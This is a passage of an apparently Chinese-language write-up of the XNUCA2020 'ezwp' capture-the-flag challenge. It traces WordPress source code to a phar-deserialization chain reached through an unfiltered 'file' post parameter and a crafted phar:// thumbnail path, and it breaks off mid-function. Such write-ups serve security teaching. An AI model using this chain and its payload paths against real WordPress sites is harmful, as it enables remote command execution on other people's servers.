class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve HTML form for modifying the image attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@global</span> string $redir_tab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int          $attachment_id Attachment ID for modification.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|array $args          Optional. Override defaults.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string HTML form for attachment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_media_item</span>(<span class="params"> $attachment_id, $args = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">$post_mime_types = get_post_mime_types();</span><br><span class="line">$keys            = array_keys( wp_match_mime_types( array_keys( $post_mime_types ), $post-&gt;post_mime_type ) );</span><br><span class="line">$type            = reset( $keys );</span><br><span class="line">$type_html       = <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; id=&#x27;type-of-<span class="subst">$attachment_id</span>&#x27; value=&#x27;&quot;</span> . esc_attr( $type ) . <span class="string">&quot;&#x27; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$form_fields = get_attachment_fields_to_edit( $post, $parsed_args[<span class="string">&#x27;errors&#x27;</span>] );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $parsed_args[<span class="string">&#x27;toggle&#x27;</span>] ) &#123;</span><br><span class="line">$class        = <span class="keyword">empty</span>( $parsed_args[<span class="string">&#x27;errors&#x27;</span>] ) ? <span class="string">&#x27;startclosed&#x27;</span> : <span class="string">&#x27;startopen&#x27;</span>;</span><br><span class="line">$toggle_links = <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;a class=&#x27;toggle describe-toggle-on&#x27; href=&#x27;#&#x27;&gt;<span class="subst">$toggle_on</span>&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;a class=&#x27;toggle describe-toggle-off&#x27; href=&#x27;#&#x27;&gt;<span class="subst">$toggle_off</span>&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$class        = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$toggle_links = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $item .= <span class="string">&quot;\t&lt;/tbody&gt;\n&quot;</span>;</span><br><span class="line">$item .= <span class="string">&quot;\t&lt;/table&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ( $hidden_fields <span class="keyword">as</span> $name =&gt; $value ) &#123;</span><br><span class="line">$item .= <span class="string">&quot;\t&lt;input type=&#x27;hidden&#x27; name=&#x27;<span class="subst">$name</span>&#x27; id=&#x27;<span class="subst">$name</span>&#x27; value=&#x27;&quot;</span> . esc_attr( $value ) . <span class="string">&quot;&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $post-&gt;post_parent &lt; <span class="number">1</span> &amp;&amp; <span class="keyword">isset</span>( $_REQUEST[<span class="string">&#x27;post_id&#x27;</span>] ) ) &#123;</span><br><span class="line">$parent      = (<span class="keyword">int</span>) $_REQUEST[<span class="string">&#x27;post_id&#x27;</span>];</span><br><span class="line">$parent_name = <span class="string">&quot;attachments[<span class="subst">$attachment_id</span>][post_parent]&quot;</span>;</span><br><span class="line">$item       .= <span class="string">&quot;\t&lt;input type=&#x27;hidden&#x27; name=&#x27;<span class="subst">$parent_name</span>&#x27; id=&#x27;<span class="subst">$parent_name</span>&#x27; value=&#x27;<span class="subst">$parent</span>&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个非常大的函数，该函数的作用就是构造HTML输出页面，其中刚好包含了构造表单的函数。那么再看哪里可以触发get_media_item。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Media management action handler.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@subpackage</span> Administration</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Load WordPress Administration Bootstrap */</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/admin.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$parent_file  = <span class="string">&#x27;upload.php&#x27;</span>;</span><br><span class="line">$submenu_file = <span class="string">&#x27;upload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">wp_reset_vars( <span class="keyword">array</span>( <span class="string">&#x27;action&#x27;</span> ) );</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ( $action ) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// No break.</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;edit&#x27;</span>:</span><br><span class="line">$title = __( <span class="string">&#x27;Edit Media&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $errors ) ) &#123;</span><br><span class="line">$errors = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $_GET[<span class="string">&#x27;attachment_id&#x27;</span>] ) ) &#123;</span><br><span class="line">wp_redirect( admin_url( <span class="string">&#x27;upload.php&#x27;</span> ) );</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$att_id = (<span class="keyword">int</span>) $_GET[<span class="string">&#x27;attachment_id&#x27;</span>];</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        &lt;form method=&quot;post&quot; class=&quot;media-upload-form&quot; id=&quot;media-single-form&quot;&gt;</span><br><span class="line">&lt;p class=&quot;submit&quot; style=&quot;padding-bottom: 0;&quot;&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> submit_button( __( <span class="string">&#x27;Update Media&#x27;</span> ), <span class="string">&#x27;primary&#x27;</span>, <span class="string">&#x27;save&#x27;</span>, <span class="literal">false</span> ); <span class="meta">?&gt;</span></span><br><span class="line">&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;media-single&quot;&gt;</span><br><span class="line">&lt;div id=&quot;media-item-&lt;?php echo $att_id; ?&gt;&quot; class=&quot;media-item&quot;&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> get_media_item(</span><br><span class="line">$att_id,</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;toggle&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;send&#x27;</span>       =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;delete&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;show_title&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"><span class="string">&#x27;errors&#x27;</span>     =&gt; ! <span class="keyword">empty</span>( $errors[ $att_id ] ) ? $errors[ $att_id ] : <span class="literal">null</span>,</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">     <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到了这里，已经进入了一个前端页面中，代表我们可以直接访问了，访问地址为”/wp-admin/media.php”。可以看到在一个前端输出中调用了get_media_item，该输出位于一个case中，条件为action参数是edit，并且需要一个合法的attachment_id参数，如下图所示。需要注意的是该利用链中的所有的id（包括attachment_id或者post_id等等）均指上传的附件id。</p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/1.png"></p><p>测试一下该利用链是否可以跳转到file_exists函数，手动patch一下源码，加了一个die，之所以加在if的前面是因为还没有设置imagedata。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">$imagedata = wp_get_attachment_metadata( $post-&gt;ID );</span><br><span class="line"><span class="keyword">if</span> ( ! is_array( $imagedata ) ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = get_attached_file( $post-&gt;ID );</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $imagedata[<span class="string">&#x27;thumb&#x27;</span>] ) ) &#123;</span><br><span class="line">    $thumbfile = str_replace( basename( $file ), $imagedata[<span class="string">&#x27;thumb&#x27;</span>], $file );</span><br><span class="line">    <span class="keyword">if</span> ( file_exists( $thumbfile ) ) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>可以成功触发。</p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/2.png"></p><p>最终的漏洞利用链如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">switch case &#39;edit&#39; [wp-admin&#x2F;media.php:47] -&gt;</span><br><span class="line">get_media_item [wp-admin&#x2F;media.php:142] -&gt;</span><br><span class="line">get_attachment_fields_to_edit [wp-admin&#x2F;includes&#x2F;media.php:1596] -&gt;</span><br><span class="line">image_size_input_fields [wp-admin&#x2F;includes&#x2F;media.php:1459] -&gt;</span><br><span class="line">image_downsize [wp-admin&#x2F;includes&#x2F;media.php:1156] -&gt;</span><br><span class="line">wp_get_attachment_thumb_file [wp-includes&#x2F;media.php:244] -&gt;</span><br><span class="line">file_exists(&quot;phar:&#x2F;&#x2F;.....&quot;) [wp-includes&#x2F;post.php:6148] -&gt;</span><br><span class="line">execute command</span><br></pre></td></tr></table></figure><p>接下来就需要控制_wp_attachment_metadata与_wp_attached_file字段的值，其中_wp_attachment_metadata字段就是imagedata的值，_wp_attached_file就是file的值，控制file为<code>Z:\Z</code>之后就要控制imagedata[‘thumb’]的值为<code>phar://../wp-content/uploads/2020/12/a.gif/test.txt</code>，a.gif就是上传的附件。</p><p>在以前的WordPress中可以通过meta_input参数就可以直接控制数据库中各表的数据，但是之后WordPress补了这个洞，Patch如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns only allowed post data fields</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 5.0.1</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $post_data Array of post data. Defaults to the contents of $_POST.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array|WP_Error Array of post data on success, WP_Error on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_wp_get_allowed_postdata</span>(<span class="params"> $post_data = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $post_data ) ) &#123;</span><br><span class="line">$post_data = $_POST;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pass through errors.</span></span><br><span class="line"><span class="keyword">if</span> ( is_wp_error( $post_data ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> $post_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> array_diff_key( $post_data, array_flip( <span class="keyword">array</span>( <span class="string">&#x27;meta_input&#x27;</span>, <span class="string">&#x27;guid&#x27;</span> ) ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接过滤了meta_input与guid参数，另外需要说明的是在官方的补丁中还包含了file参数，但是在该题目中却并没有（上面的源码是题目中的）这就导致了可以利用file参数控制_wp_attachment_metadata与_wp_attached_file字段。</p><h1 id="0x3-wp-attached-file"><a href="#0x3-wp-attached-file" class="headerlink" title="0x3 wp_attached_file"></a>0x3 wp_attached_file</h1><p>首先需要修改_wp_attached_file字段。在/wp-admin/post.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">switch</span> ( $action ) &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;editpost&#x27;</span>:</span><br><span class="line">check_admin_referer( <span class="string">&#x27;update-post_&#x27;</span> . $post_id );</span><br><span class="line"></span><br><span class="line">$post_id = edit_post();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Session cookie flag that the post was saved.</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>( $_COOKIE[<span class="string">&#x27;wp-saving-post&#x27;</span>] ) &amp;&amp; $_COOKIE[<span class="string">&#x27;wp-saving-post&#x27;</span>] === $post_id . <span class="string">&#x27;-check&#x27;</span> ) &#123;</span><br><span class="line">setcookie( <span class="string">&#x27;wp-saving-post&#x27;</span>, $post_id . <span class="string">&#x27;-saved&#x27;</span>, time() + DAY_IN_SECONDS, ADMIN_COOKIE_PATH, COOKIE_DOMAIN, is_ssl() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">redirect_post( $post_id ); <span class="comment">// Send user on their way while we keep working.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>流程转入edit_post函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Update an existing post with values provided in $_POST.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If post data is passed as an argument, it is treated as an array of data</span></span><br><span class="line"><span class="comment"> * keyed appropriately for turning into a post object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If post data is not passed, the $_POST global variable is used instead.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@global</span> wpdb $wpdb WordPress database abstraction object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $post_data Optional. Defaults to the $_POST global.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int Post ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_post</span>(<span class="params"> $post_data = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">$post_data = _wp_translate_postdata( <span class="literal">true</span>, $post_data );</span><br><span class="line"><span class="keyword">if</span> ( is_wp_error( $post_data ) ) &#123;</span><br><span class="line">wp_die( $post_data-&gt;get_error_message() );</span><br><span class="line">&#125;</span><br><span class="line">$translated = _wp_get_allowed_postdata( $post_data );</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// Attachment stuff.</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="string">&#x27;attachment&#x27;</span> === $post_data[<span class="string">&#x27;post_type&#x27;</span>] ) &#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>( $post_data[<span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>] ) ) &#123;</span><br><span class="line">$image_alt = wp_unslash( $post_data[<span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>] );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( get_post_meta( $post_ID, <span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>, <span class="literal">true</span> ) !== $image_alt ) &#123;</span><br><span class="line">$image_alt = wp_strip_all_tags( $image_alt, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// update_post_meta() expects slashed.</span></span><br><span class="line">update_post_meta( $post_ID, <span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>, wp_slash( $image_alt ) );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$attachment_data = <span class="keyword">isset</span>( $post_data[<span class="string">&#x27;attachments&#x27;</span>][ $post_ID ] ) ? $post_data[<span class="string">&#x27;attachments&#x27;</span>][ $post_ID ] : <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/** This filter is documented in wp-admin/includes/media.php */</span></span><br><span class="line">$translated = apply_filters( <span class="string">&#x27;attachment_fields_to_save&#x27;</span>, $translated, $attachment_data );</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">$success = wp_update_post( $translated );</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中translated保存了过滤后的post数据，由于题目中没有过滤file参数，所以这里的translated中依旧存在file参数。再看wp_update_post函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Update a post with new post data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The date does not have to be set for drafts. You can set the date and it will</span></span><br><span class="line"><span class="comment"> * not be overridden.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.0.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array|object $postarr  Optional. Post data. Arrays are expected to be escaped,</span></span><br><span class="line"><span class="comment"> *                               objects are not. Default array.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool         $wp_error Optional. Allow return of WP_Error on failure. Default false.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int|WP_Error The post ID on success. The value 0 or WP_Error on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_update_post</span>(<span class="params"> $postarr = <span class="keyword">array</span>(<span class="params"></span>), $wp_error = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="comment">// Merge old and new fields with new fields overwriting old ones.</span></span><br><span class="line">$postarr                  = array_merge( $post, $postarr );</span><br><span class="line">$postarr[<span class="string">&#x27;post_category&#x27;</span>] = $post_cats;</span><br><span class="line"><span class="keyword">if</span> ( $clear_date ) &#123;</span><br><span class="line">$postarr[<span class="string">&#x27;post_date&#x27;</span>]     = current_time( <span class="string">&#x27;mysql&#x27;</span> );</span><br><span class="line">$postarr[<span class="string">&#x27;post_date_gmt&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">return</span> wp_insert_post( $postarr, $wp_error );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>流程转入到wp_insert_post。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Insert or update a post.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If the $postarr parameter has &#x27;ID&#x27; set to a value, then post will be updated.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can set the post date manually, by setting the values for &#x27;post_date&#x27;</span></span><br><span class="line"><span class="comment"> * and &#x27;post_date_gmt&#x27; keys. You can close the comments or open the comments by</span></span><br><span class="line"><span class="comment"> * setting the value for &#x27;comment_status&#x27; key.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.0.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 4.2.0 Support was added for encoding emoji in the post title, content, and excerpt.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 4.4.0 A &#x27;meta_input&#x27; array can now be passed to `$postarr` to add post meta data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_insert_post</span>(<span class="params"> $postarr, $wp_error = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="string">&#x27;attachment&#x27;</span> === $postarr[<span class="string">&#x27;post_type&#x27;</span>] ) &#123;</span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $postarr[<span class="string">&#x27;file&#x27;</span>] ) ) &#123;</span><br><span class="line">update_attached_file( $post_ID, $postarr[<span class="string">&#x27;file&#x27;</span>] );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $postarr[<span class="string">&#x27;context&#x27;</span>] ) ) &#123;</span><br><span class="line">add_post_meta( $post_ID, <span class="string">&#x27;_wp_attachment_context&#x27;</span>, $postarr[<span class="string">&#x27;context&#x27;</span>], <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接传递postarr[‘file’]，再看update_attached_file。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Update attachment file path based on attachment ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Used to update the file path of the attachment, which uses post meta name</span></span><br><span class="line"><span class="comment"> * &#x27;_wp_attached_file&#x27; to store the path of the attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int    $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $file          File path for the attachment.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool True on success, false on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_attached_file</span>(<span class="params"> 